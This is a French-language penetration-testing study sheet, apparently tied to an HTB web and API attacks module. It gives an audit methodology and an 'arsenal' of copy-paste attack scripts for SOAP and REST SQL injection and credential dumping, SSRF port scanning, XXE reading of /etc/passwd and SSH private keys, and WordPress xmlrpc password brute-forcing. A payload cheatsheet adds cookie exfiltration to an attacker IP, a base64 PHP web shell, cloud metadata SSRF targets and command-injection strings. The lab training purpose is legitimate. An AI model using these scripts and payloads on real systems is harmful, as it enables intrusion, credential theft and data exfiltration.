---
titre: "Méthodologie générale & Arsenal (API / Web Server)"
tags: [Failles, méthodologie, arsenal, cheatsheet]
---

# Méthodologie générale & Arsenal (API / Web Server)

> Fiche transverse : démarche d'audit, fondamentaux et scripts prêts à l'emploi couvrant plusieurs failles (SQLi, SSRF, XXE, xmlrpc…). Les fiches par faille renvoient ici pour les scripts pratiques.

## Sommaire

- [[#Démarche d'audit|Démarche d'audit]]
- [[#Fondamentaux|Fondamentaux]]
- [[#Arsenal — scripts prêts à l'emploi|Arsenal — scripts prêts à l'emploi]]
- [[#Cheatsheet payloads (multi-vulns)|Cheatsheet payloads (multi-vulns)]]


## Démarche d'audit

> Le fil rouge du module. Pendant l'apprentissage on a tâtonné ; voici la **démarche ordonnée** à suivre pour ne rien rater et gagner du temps. À dérouler dans l'ordre sur toute cible web/API.

Lié : 00 - Méthodologie & Arsenal · [[CLI — ffuf, sqlmap, nmap, curl]]

---

### Phase 0 — Connectivité & cadrage

```bash
# VPN monté ?
ip a show tun0                 # doit afficher une IP 10.10.x.x
ping -c2 <TARGET_IP>           # la cible répond ?
```

- Note l'IP cible (elle **change à chaque respawn** — vérifie-la dans toutes tes commandes).
- Note ton IP `tun0` (utile pour SSRF / XXE / reverse shells).

---

### Phase 1 — Reconnaissance réseau (découvrir les ports)

> ❗ Ne jamais supposer le port. Le cours donne 3002/3003 mais en vrai **on scanne**.

```bash
# scan complet des 65535 ports, rapide
nmap -p- --min-rate 5000 -T4 <TARGET_IP>

# puis scan de version + scripts sur les ports trouvés
nmap -p <PORTS_OUVERTS> -sV -sC <TARGET_IP>
```

Alternatives rapides si `nmap` absent :
```bash
rustscan -a <TARGET_IP> -- -sV
for p in 80 3000 3001 3002 3003 8080; do nc -zv -w1 <TARGET_IP> $p 2>&1; done
```

---

### Phase 2 — Fingerprinting de chaque service web

Pour **chaque port HTTP** trouvé :

```bash
curl -i http://<TARGET_IP>:<PORT>/            # headers, techno, redirections
curl -s http://<TARGET_IP>:<PORT>/ | head -40 # corps de la page
whatweb http://<TARGET_IP>:<PORT>/            # techno (si dispo)
```

Ce que tu cherches : serveur (Apache/Nginx/Express), langage (`X-Powered-By: PHP/Express`), framework, présence d'une API (`{"status":"UP"}`), page d'auth, formulaire d'upload, XML dans les requêtes.

---

### Phase 3 — Découverte de contenu (3 surfaces distinctes)

> ⚠️ Erreur classique : confondre **chemins**, **paramètres** et **endpoints d'API**. Ce sont 3 fuzzing différents. Voir [[CLI — ffuf, sqlmap, nmap, curl]].

#### 3.1 — Chemins / répertoires
```bash
dirb http://<TARGET_IP>:<PORT>
# ou
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://<TARGET_IP>:<PORT>/FUZZ
```
→ trouve `/wsdl`, `/uploads`, `/admin`, `xmlrpc.php`, etc.

#### 3.2 — Paramètres GET cachés
Utile quand une page répond **200 avec un corps vide/constant** (ex. `/wsdl` renvoyait rien).
```bash
# 1) d'abord SANS filtre pour repérer la taille "de base"
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -u 'http://<TARGET_IP>:<PORT>/?FUZZ=test'
# 2) puis filtre cette taille pour isoler l'anomalie
ffuf -w .../burp-parameter-names.txt \
     -u 'http://<TARGET_IP>:<PORT>/?FUZZ=test' -fs <TAILLE_DE_BASE>
```
→ trouve `?wsdl`, `?id`, `?debug`, `?file`...

#### 3.3 — Endpoints d'API
Wordlist **spécifique API** (pas la même que les params) :
```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \
     -u 'http://<TARGET_IP>:<PORT>/api/FUZZ' -fs <TAILLE_DE_BASE>
```
→ trouve `/api/download`, `/api/userinfo`, `/api/login`...

> 💡 Le fuzzing a des **limites** : un endpoint au nom custom (`userinfo`) peut échapper aux wordlists. Complète avec :
> - Analyse du **JS front-end** (`grep -r "/api/" *.js`) — les routes y sont souvent en dur
> - Doc auto : `/swagger.json`, `/api-docs`, `/openapi.json`
> - Observation du trafic réel dans **Burp / Caido** en naviguant l'app

#### 3.4 — WSDL / doc de service (si SOAP)
```bash
curl http://<TARGET_IP>:<PORT>/wsdl          # souvent vide seul
curl http://<TARGET_IP>:<PORT>/wsdl?wsdl     # le paramètre débloque le contenu
```
Variantes : `?wsdl`, `/service.wsdl`, `/example.disco?disco`. Voir [[WSDL & SOAP - Index]].

---

### Phase 4 — Analyse : mapper la surface d'attaque

Pour chaque endpoint/paramètre trouvé, note :
- **Méthode** (GET/POST), **format attendu** (JSON ? XML ? form ? Base64 ?)
- **Paramètres** et ce qu'ils semblent faire
- **Réflexions** : mon input revient-il dans la réponse ? (→ XSS / XXE in-band / SQLi error-based)
- Le **SGBD / langage** si un message d'erreur le révèle

Pour un service SOAP : lis le **WSDL** → il liste toutes les opérations et leurs paramètres (= tes points d'injection). Voir [[WSDL & SOAP - Index]].

---

### Phase 5 — Test systématique des vulnérabilités (checklist)

Passe chaque paramètre/endpoint dans cette grille :

- [ ] **SQLi** → `'` puis `UNION SELECT` (voir [[SQLI - Index]])
- [ ] **Command Injection** → paramètre injecté dans une commande shell ? fonctions PHP appelables ? (voir [[Command Injection - Index]])
- [ ] **LFI / Path Traversal** → param = nom de fichier ? teste `..%2f..%2fetc%2fpasswd` (voir [[LFI - Index]])
- [ ] **XSS** → input réfléchi ? teste `<script>` puis encodages (voir [[XSS - Index]])
- [ ] **SSRF** → param qui fetch une ressource ? teste `http://TON_IP`, en clair / Base64 / encodé (voir [[SSRF - Index]])
- [ ] **XXE** → l'app parse du XML que je contrôle ? injecte un DOCTYPE (voir [[XXE - Index]])
- [ ] **File Upload** → upload possible ? teste `.php`, faux Content-Type, magic bytes (voir [[File Upload - Index]])
- [ ] **ReDoS** → validation par regex ? mesure le temps avec un input long (voir [[ReDoS - Index]])
- [ ] **SOAPAction Spoofing** → opération bloquée + filtre basé sur le header ? (voir [[WSDL & SOAP - Index]])
- [ ] **Auth bypass / IDOR** → énumération d'IDs, `' OR '1'='1`

#### Règle d'or des ENCODAGES
Un paramètre qui **refuse** ton input ≠ paramètre **protégé**. Teste systématiquement, dans l'ordre :
1. En clair
2. **URL-encoding** simple (`%2f`, `%20`, `%3C`)
3. **Double URL-encoding** (`%252f`) — utile face à un WAF/proxy qui décode une couche
4. **Base64** (cf. SSRF : l'URL brute rejetée, la Base64 acceptée)
5. Variantes spécifiques (IP décimale/hexa, wrappers `php://`, casse mixte)

---

### Phase 6 — Exploitation

- Construis le PoC minimal qui **prouve** la faille (une connexion sur ton listener, un fichier lu, une commande exécutée).
- Puis **escalade** : RCE → reverse shell, LFI → clés SSH / log poisoning, SQLi → dump complet.
- Garde tes scripts (voir Arsenal Shells Python, 00 - Méthodologie & Arsenal).

---

### Phase 7 — Post-exploitation & documentation

- Récupère **le code source** dès que tu as un accès (`cat app.js`, `cat ping-server.php`) → comprends la faille + cherche creds en dur, autres endpoints, clés.
- Énumère : `id`, `hostname`, `uname -a`, `/etc/passwd`, `env`, ports internes (`ss -tulnp`).
- Documente : requête, payload, réponse, impact (triade CIA), remédiation.

---

### 🧭 Arbre de décision express

```
Service HTTP ?
├── Renvoie du XML dans les requêtes ? ──────► XXE (14) / SOAP
│      └── WSDL accessible ? ────────────────► WSDL enum (03) → SOAPAction spoof (04) / SQLi SOAP (08)
├── Paramètre = nom de fichier ? ────────────► LFI (10) / File read
├── Paramètre fetch une URL ? ───────────────► SSRF (12)
├── Formulaire d'upload ? ───────────────────► File Upload (09)
├── Input réfléchi dans la réponse ? ────────► XSS (11) / SQLi error-based (08)
├── Validation regex (email, tel...) ? ──────► ReDoS (13)
├── Param injecté dans une commande ? ───────► Command Injection (05)
└── WordPress ? ─────────────────────────────► xmlrpc.php (06)
```


## Fondamentaux

Lié : 00 - Méthodologie & Arsenal · [[WSDL & SOAP - Index]]

---

### Web Service vs API

- **API** (Application Programming Interface) : ensemble de règles pour faire communiquer deux logiciels. Peut fonctionner **hors ligne**.
- **Web Service** : un **type particulier d'API** qui **nécessite un réseau**.

> 🔑 Tout web service est une API, mais **l'inverse n'est pas vrai**.

| | Web Service | API (générale) |
|---|---|---|
| Réseau | requis | pas toujours |
| Accès dev externes | rare | fréquent |
| Protocole typique | SOAP | XML-RPC, JSON-RPC, SOAP, REST, gRPC, GraphQL |
| Format données | souvent XML | souvent JSON |

---

### Les 4 technologies clés

#### XML-RPC — le plus simple
Appel de procédure distante encodé en **XML**, transport **HTTP**. Requête = `<methodCall>` avec `<methodName>` + `<params>`.
```xml
<?xml version="1.0"?>
<methodCall>
  <methodName>examples.getStateName</methodName>
  <params><param><value><i4>41</i4></value></param></params>
</methodCall>
```
> 🎯 En pratique : c'est **exactement** ce qu'est `xmlrpc.php` de WordPress. Voir [[WordPress xmlrpc - Index]].

#### JSON-RPC — pareil mais en JSON
Plus léger. 3 propriétés : `method`, `params`, `id` (le serveur renvoie le même `id`).
```json
{"method": "sum", "params": {"a":3, "b":4}, "id":0}
--> {"result": 7, "error": null, "id": 0}
```

#### SOAP — lourd et structuré
XML rigide. Un message a une structure fixe : `Envelope` > `Header` (optionnel) + `Body` (obligatoire) + `Fault` (erreurs). Un fichier **WSDL** (optionnel) décrit comment l'utiliser.
```xml
<SOAP-ENV:Envelope xmlns:SOAP-ENV="...">
  <SOAP-ENV:Body>
    <m:GetQuotation><m:QuotationsName>MicroSoft</m:QuotationsName></m:GetQuotation>
  </SOAP-ENV:Body>
</SOAP-ENV:Envelope>
```
Header HTTP spécial : **`SOAPAction`** = nom de l'opération. Source de la faille [[WSDL & SOAP - Index]].

#### REST — le standard actuel
Pas un protocole strict, une **convention**. Utilise les **verbes HTTP** (`GET`/`POST`/`PUT`/`DELETE`) sur des ressources. XML ou JSON. ~90 % des API modernes.

---

### Anatomie d'un fichier WSDL (6 éléments)

> Pense au WSDL comme à la **doc d'une classe POO**. C'est la carte d'identité d'un service SOAP. Détails d'exploitation : [[WSDL & SOAP - Index]].

| Élément | Rôle | Analogie POO |
|---|---|---|
| `<definitions>` | racine, namespaces, nom du service | fichier / package |
| `<types>` | structures de données échangées | struct / classe |
| `<message>` | wrapper input/output d'une opération | signature |
| `<portType>` | liste des **opérations** dispo (in/out) | **interface** |
| `<operation>` | une action SOAP + son encodage | **méthode** |
| `<binding>` | comment appeler (HTTP, soapAction) | implémentation |
| `<service>` | URL réelle du service | point d'entrée |

> ❓ *Question HTB* : une `<operation>` WSDL correspond à une **Méthode** en programmation.

---

### Vecteurs d'attaque par techno (vue d'ensemble)

| Techno | Vecteurs principaux |
|---|---|
| SOAP / XML-RPC | XXE, injection XML, SOAPAction spoofing, SQLi via messages, mauvaise gestion WSDL |
| REST / JSON | auth bypass, IDOR, SQLi, SSRF, LFI, rate limiting absent, info disclosure |
| JSON-RPC | manipulation de params, méthodes non documentées |
| WordPress xmlrpc | brute-force (`wp.getUsersBlogs`), SSRF (`pingback.ping`), amplification (`system.multicall`) |


## Arsenal — scripts prêts à l'emploi

> Scripts réutilisables : SQLi SOAP (colonnes → dump), SQLi API, énumération d'IDs, scan de ports par SSRF, XXE. Copier-coller, adapter l'URL/les champs.

Lié : [[SQLI - Index]] · [[SSRF - Index]] · [[XXE - Index]] · Arsenal Shells Python

---

### #1 — SQLi SOAP : trouver le nombre de colonnes ⭐

Le script qui a résolu le Skills Assessment. Teste automatiquement 1→N colonnes, distingue *hang* / erreur / réponse propre.

```python
#!/usr/bin/env python3
"""SQLi SOAP — auto column count. Usage: python3 soap_cols.py"""
import requests

URL = "http://TARGET:3002/wsdl"
NS  = "http://tempuri.org/"

def login(username, password="test", timeout=8):
    payload = (f'<?xml version="1.0" encoding="utf-8"?>'
        f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="{NS}">'
        f'<soap:Body><LoginRequest xmlns="{NS}">'
        f'<username>{username}</username><password>{password}</password>'
        f'</LoginRequest></soap:Body></soap:Envelope>')
    try:
        return requests.post(URL, data=payload,
                             headers={"SOAPAction": '"Login"'}, timeout=timeout).text
    except requests.exceptions.ReadTimeout:
        return "[HANG]"

for n in range(1, 11):
    nulls = ",".join(["NULL"] * n)
    inj = f"admin' UNION SELECT {nulls}-- -"
    out = login(inj)
    tag = "HANG" if out == "[HANG]" else ("ERROR" if "Error" in out or "error" in out else "OK ✅")
    print(f"[{n:>2} col] {tag}  {out[:120]}")
    print("-" * 50)
```
→ La ligne `OK ✅` (ni HANG ni ERROR) = le bon nombre de colonnes (5 dans le module).

---

### #2 — SQLi SOAP : identifier la colonne + dumper

```python
#!/usr/bin/env python3
"""SQLi SOAP — extraction. Adapter N (nb colonnes) et la requête."""
import requests, re

URL, NS, N = "http://TARGET:3002/wsdl", "http://tempuri.org/", 5

def login(username, password="test", timeout=8):
    payload = (f'<?xml version="1.0" encoding="utf-8"?>'
        f'<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="{NS}">'
        f'<soap:Body><LoginRequest xmlns="{NS}">'
        f'<username>{username}</username><password>{password}</password>'
        f'</LoginRequest></soap:Body></soap:Envelope>')
    try:
        return requests.post(URL, data=payload, headers={"SOAPAction": '"Login"'}, timeout=timeout).text
    except requests.exceptions.ReadTimeout:
        return "[HANG]"

# 1) marqueurs pour voir quelles colonnes s'affichent
markers = ",".join(f"'{i}'" for i in range(1, N + 1))
print("[*] Marqueurs :"); print(login(f"zzz' UNION SELECT {markers}-- -"))

# 2) dump : placer la donnée dans chaque colonne (ici les 5)
cols = "id,name,email,username,password"     # adapter aux vraies colonnes
inj  = f"zzz' UNION SELECT {cols} FROM users WHERE username='admin'-- -"
resp = login(inj)
print("\n[*] Réponse admin :"); print(resp)
m = re.search(r"<password>(.*?)</password>", resp)
if m: print(f"\n[+] PASSWORD = {m.group(1)}")
```

> Si `FROM users` échoue → énumérer via `sqlite_master` (SQLite) ou `information_schema` (MySQL). Voir [[SQLI - Index]].

---

### #3 — SQLi API REST (curl one-liner sûr)

Éviter l'enfer des espaces dans l'URL avec `-G` + `--data-urlencode` :
```bash
curl -G "http://TARGET:3003/" \
  --data-urlencode "id=0 UNION ALL SELECT NULL,username,NULL FROM users WHERE position=736373-- -"
```
Étapes : `id=1'` (confirmer) → `id=1 ORDER BY 3-- -` (colonnes) → `id=0 UNION SELECT 111,222,333-- -` (colonne affichée) → extraction.

---

### #4 — sqlmap sur SOAP (requête sauvegardée)

Sauver la requête SOAP dans un fichier avec `*` au point d'injection :
```
# soap_req.txt
POST /wsdl HTTP/1.1
Host: TARGET:3002
SOAPAction: "Login"
Content-Type: text/xml

<?xml version="1.0"?><soap:Envelope ...><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>admin*</username><password>test</password></LoginRequest></soap:Body></soap:Envelope>
```
```bash
sqlmap -r soap_req.txt --dump -T users --batch
```
Sur API REST : `sqlmap -u "http://TARGET:3003/?id=1" --dump -T users --batch`

---

### #5 — Énumération d'IDs (info disclosure)

```python
import requests, sys
base = sys.argv[1]                       # http://TARGET:3003
for val in range(1, 10000):
    r = requests.get(f"{base}/?id={val}")
    if "position" in r.text:
        print(val, r.text.strip())
```

---

### #6 — Scan de ports interne par SSRF

Transforme la SSRF en scanner (voir [[SSRF - Index]]). Ouvert = timeout, fermé = réponse rapide.

```python
#!/usr/bin/env python3
import requests, base64

TARGET = "http://TARGET:3000/api/userinfo"
HOST   = "127.0.0.1"
PORTS  = [22, 80, 3000, 3001, 3002, 3306, 6379, 8080, 9999]

def b64url(port):
    return base64.b64encode(f"http://{HOST}:{port}".encode()).decode()

for p in PORTS:
    blob = b64url(p)
    try:
        r = requests.get(f"{TARGET}?id={blob}", timeout=4)
        # réponse rapide + "Cannot reach" = fermé
        state = "FERMÉ" if "Cannot reach" in r.text else "OUVERT (réponse)"
    except requests.exceptions.ReadTimeout:
        state = "OUVERT (hang/timeout)"    # connexion établie → l'API attend
    print(f"[{HOST}:{p:>5}] {state}")
```

---

### #7 — XXE : lecture de fichier in-band

```python
#!/usr/bin/env python3
import requests, re

URL = "http://TARGET:3001/api/login"

def read_file(path):
    payload = (f'<?xml version="1.0" encoding="UTF-8"?>'
        f'<!DOCTYPE pwn [<!ENTITY x SYSTEM "file://{path}"> ]>'
        f'<root><email>&x;</email><password>test</password></root>')
    r = requests.post(URL, data=payload, timeout=10)
    # l'app réfléchit l'email dans son message d'erreur → extraire
    m = re.search(r"account with\s*<b>(.*?)</b>", r.text, re.DOTALL)
    return m.group(1) if m else r.text

for f in ["/etc/passwd", "/etc/hostname", "/home/ubuntu/.ssh/id_rsa"]:
    print(f"=== {f} ===")
    print(read_file(f), "\n")
```

---

### #8 — Brute-force xmlrpc.php (WordPress)

```python
import requests

URL = "http://blog.cible.com/xmlrpc.php"
USER = "admin"
def try_pw(pw):
    data = (f"<methodCall><methodName>wp.getUsersBlogs</methodName><params>"
            f"<param><value>{USER}</value></param>"
            f"<param><value>{pw}</value></param></params></methodCall>")
    r = requests.post(URL, data=data)
    return "isAdmin" in r.text        # True = mdp correct

for pw in open("rockyou.txt", encoding="latin-1"):
    pw = pw.strip()
    if try_pw(pw):
        print(f"[+] TROUVÉ : {USER}:{pw}"); break
```
> ⚡ Version dévastatrice : `system.multicall` teste des centaines de mdp en 1 requête (cf. [[WordPress xmlrpc - Index]]).


## Cheatsheet payloads (multi-vulns)

> Tous les payloads du module en un endroit. Ctrl+F ton besoin.

Lié : 00 - Méthodologie & Arsenal

---

### 🗄️ SQL Injection

#### Détection
```
'        "        `        \        ')       ";
1' OR '1'='1        1 OR 1=1        admin'-- -
```

#### UNION — méthode
```
' ORDER BY 1-- -   (incrémente jusqu'à l'erreur → nb colonnes)
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT '1','2','3'-- -            (repérer la colonne affichée)
' UNION SELECT username,password,NULL FROM users-- -
```
Commentaires : `-- -` (MySQL, espace obligatoire) · `#` · `/* */`

#### Auth bypass
```
' OR '1'='1'-- -
admin'-- -
' OR 1=1 LIMIT 1-- -
```

#### MySQL — énumération
```
' UNION SELECT table_name,NULL FROM information_schema.tables-- -
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT @@version,database()-- -
```

#### SQLite — énumération (⚠️ SGBD du Skills Assessment)
```
' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'-- -
' UNION SELECT sqlite_version(),NULL-- -
```

#### SOAP — extraction ciblée (contexte module)
```
admin' UNION SELECT NULL,NULL,NULL,NULL,NULL-- -            (5 colonnes)
admin' UNION SELECT '1','2','3','4','5'-- -                 (marqueurs)
zzz' UNION SELECT id,name,email,username,password FROM users WHERE username='admin'-- -
```

---

### 📂 LFI / Path Traversal

```
../../../../etc/passwd
..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd     (encodé, spammer les ../)
....//....//etc/passwd                              (bypass filtre ../ )
%252e%252e%252f                                     (double encodage)
..%c0%af..%c0%af                                    (UTF-8 overlong)
```
Wrappers PHP :
```
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/read=string.rot13/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTs/Pg==
expect://id
```
Cibles :
```
/etc/passwd  /etc/shadow  /etc/hosts
/home/<user>/.ssh/id_rsa  id_ed25519  id_ecdsa
/var/www/html/config.php  app.js  .env  wp-config.php
/proc/self/environ  /proc/self/cmdline
/var/log/apache2/access.log   (log poisoning)
```

---

### 🌐 XSS

```html
<script>alert(document.domain)</script>
%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E     (URL-encodé 1x)
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<body onload=alert(1)>
<button autofocus onfocus=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
<iframe src="javascript:alert(1)">
```
Exfil cookie :
```html
<script>fetch('http://TON_IP/?c='+document.cookie)</script>
<img src=x onerror="this.src='http://TON_IP/?c='+document.cookie">
```

---

### 🔁 SSRF

```
http://TON_IP:4444                          (preuve, listener)
http://127.0.0.1:PORT                        (scan interne)
```
Base64 (format attendu par certaines API) :
```bash
echo "http://127.0.0.1:3002" | tr -d '\n' | base64
```
Bypass blacklist de 127.0.0.1 :
```
localhost      127.1      0.0.0.0      [::1]
2130706433     0x7f000001     0177.0.0.1
```
Cloud / interne :
```
http://169.254.169.254/latest/meta-data/       (AWS)
http://metadata.google.internal/                (GCP)
http://127.0.0.1:6379  (Redis)   :3306 (MySQL)   :8080 (admin)
```

---

### 📄 XXE

Preuve (OOB) :
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://TON_IP:4444">]><root><email>&x;</email><password>x</password></root>
```
Lecture de fichier (in-band) :
```xml
<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]><root><email>&x;</email><password>x</password></root>
```
PHP filter (fichiers "cassants") :
```xml
<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```
OOB via DTD externe :
```xml
<!DOCTYPE r [<!ENTITY % d SYSTEM "http://TON_VPS/evil.dtd"> %d;]>
```

---

### 💥 Command Injection

Séparateurs :
```
; id      | id      || id      && id      `id`      $(id)      %0a id
```
call_user_func_array (contexte module) :
```
/ping-server.php/system/id
/ping-server.php/system/id%20-a          (%20 = espace)
/ping-server.php/system/cat%20/etc/passwd
```

---

### 🧼 ReDoS

Pattern email vulnérable :
```
/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/
```
Payload (finir par un caractère invalide `.`) :
```
jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555.
```
Test : `time curl -m 60 "http://T:3000/api/check-email?email=<payload>"`

---

### 🧩 SOAPAction Spoofing

```xml
<!-- body=LoginRequest (autorisé) + params de ExecuteCommand + header SOAPAction=ExecuteCommand -->
<soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>id</cmd></LoginRequest></soap:Body>
```
```
Header:  SOAPAction: "ExecuteCommand"
```

---

### 🔓 Bypass rate limit / whitelist IP (headers)

```
X-Forwarded-For: 127.0.0.1
X-Forwarded-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
```

---

### 🔤 Table d'encodage URL rapide

| Char | Encodé |  | Char | Encodé |
|---|---|---|---|---|
| espace | `%20` | | `<` | `%3C` |
| `/` | `%2F` | | `>` | `%3E` |
| `?` | `%3F` | | `"` | `%22` |
| `#` | `%23` | | `'` | `%27` |
| `&` | `%26` | | `:` | `%3A` |
| `=` | `%3D` | | `%` | `%25` |

Double encodage = encoder le `%` : `/` → `%2F` → `%252F`.
